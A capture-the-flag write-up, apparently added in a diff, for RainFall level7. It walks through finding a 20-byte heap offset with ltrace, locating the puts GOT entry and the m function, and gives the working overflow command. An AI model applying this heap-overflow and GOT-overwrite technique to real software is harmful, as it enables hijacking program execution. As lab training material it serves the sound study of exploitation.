@@ -1,0 +1,113 @@
+find the adress between the a[1] buffer and the b pointer in the heap
+
+level7@RainFall:~$ ltrace ./level7 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
+__libc_start_main(0x8048521, 2, 0xbffff794, 0x8048610, 0x8048680 <unfinished ...>
+malloc(8)                                                         = 0x0804a008
+malloc(8)                                                         = 0x0804a018
+malloc(8)                                                         = 0x0804a028
+malloc(8)                                                         = 0x0804a038
+strcpy(0x0804a018, "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab"...)         = 0x0804a018
+strcpy(0x37614136, NULL <unfinished ...>  ====> 0x37614136 gives an offset of 20
+
+Gets the address of the put function in the GOT
+
+level7@RainFall:~$ objdump -R level7 | grep puts
+08049928 R_386_JUMP_SLOT   puts
+
+
+Get the address of the m function
+(gdb) p m
+$1 = {<text variable, no debug info>} 0x80484f4 <m>
+
+
+./level7 $(python -c 'print "A" * 20 + "\x28\x99\x04\x08"') $(python -c 'print "\xf4\x84\x04\x08"')
+
+
+
+
+
+
+
+
+
+
+
+
+Walkthrough: Heap Overflow and GOT Overwrite (level7)
+
+Objective:
+Exploit a heap overflow vulnerability to overwrite the GOT entry of the `puts` function, redirecting execution to the `m` function.
+
+---
+
+Step 1: Analyze Heap Allocations and Overflow Point
+
+Run the binary with `ltrace` to monitor heap allocations and string operations:
+
+    ltrace ./level7 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
+
+Output snippet:
+    malloc(8) = 0x0804a008
+    malloc(8) = 0x0804a018  <-- Buffer `a[1]`
+    malloc(8) = 0x0804a028
+    malloc(8) = 0x0804a038  <-- Pointer `b`
+
+Then:
+    strcpy(0x0804a018, "Aa0Aa1Aa2...")  --> Write to buffer
+    strcpy(0x37614136, NULL...)        --> Crash from writing past buffer
+
+From this, we determine that `b` is 20 bytes after `a[1]`.
+So, an offset of 20 bytes is needed to overflow from `a[1]` into the location that `b` points to.
+
+---
+
+Step 2: Get Address of `puts` GOT Entry
+
+To redirect execution, we will overwrite the GOT entry of `puts`.
+
+Use objdump:
+    objdump -R level7 | grep puts
+
+Output:
+    08049928 R_386_JUMP_SLOT   puts
+
+This is the GOT entry we aim to overwrite: 0x08049928
+
+---
+
+Step 3: Get Address of the Target Function (`m`)
+
+We want `puts()` to actually call the `m()` function.
+
+In gdb:
+    (gdb) p m
+    $1 = {<text variable, no debug info>} 0x80484f4 <m>
+
+Target function address: 0x080484f4
+
+---
+
+Step 4: Build the Exploit Payload
+
+The goal is to:
+- Overflow from buffer `a[1]` into the pointer `b` with 20 bytes of padding followed by the GOT address.
+- Pass a second argument which will be used by `strcpy(b, argv[2])` to write the new address into the GOT entry for `puts()`.
+
+Command:
+    ./level7 $(python -c 'print "A" * 20 + "\x28\x99\x04\x08"') $(python -c 'print "\xf4\x84\x04\x08"')
+
+Explanation:
+- First argument:
+  - `"A" * 20` → Padding to reach pointer `b`
+  - `\x28\x99\x04\x08` → Address of `puts` GOT entry
+- Second argument:
+  - `\xf4\84\x04\x08` → Address of function `m`, to be copied into the GOT entry
+
+At runtime, the program executes something like: `strcpy(b, argv[2])` where `b` now points to the `puts` GOT entry. This causes the GOT entry to be overwritten with the address of `m()`.
+
+Later, when the program calls `puts()`, it jumps to `m()` instead.
+
+---
+
+Result:
+Execution is redirected to the `m` function via GOT overwrite, completing the challenge.
